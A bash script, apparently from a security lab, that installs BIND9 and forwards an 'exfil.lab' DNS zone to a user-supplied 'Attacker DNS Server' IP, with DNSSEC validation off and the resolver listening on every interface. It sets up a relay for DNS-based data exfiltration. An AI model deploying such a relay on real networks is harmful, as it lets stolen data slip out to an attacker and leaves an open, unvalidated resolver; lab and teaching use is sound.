#!/bin/bash

echo "[*] Setting up DNS Forwarder..."

# Prompt user for the Attacker DNS Server IP
read -p "Enter the IP address of the Attacker DNS Server: " ATTACKER_IP

# Install BIND9
sudo apt update
sudo apt install -y bind9

# Configure BIND to forward exfil.lab zone to the attacker
sudo tee /etc/bind/named.conf.local > /dev/null <<EOF
zone "exfil.lab" {
    type forward;
    forwarders { ${ATTACKER_IP}; };
};
EOF

# Configure global DNS options
sudo tee /etc/bind/named.conf.options > /dev/null <<EOF
options {
    directory "/var/cache/bind";
    forwarders {
        8.8.8.8;
    };
    dnssec-validation no;
    auth-nxdomain no;
    listen-on { any; };
};
EOF

# Restart BIND
sudo systemctl restart bind9

echo "[+] DNS Forwarder ready. exfil.lab will forward to attacker at ${ATTACKER_IP}."
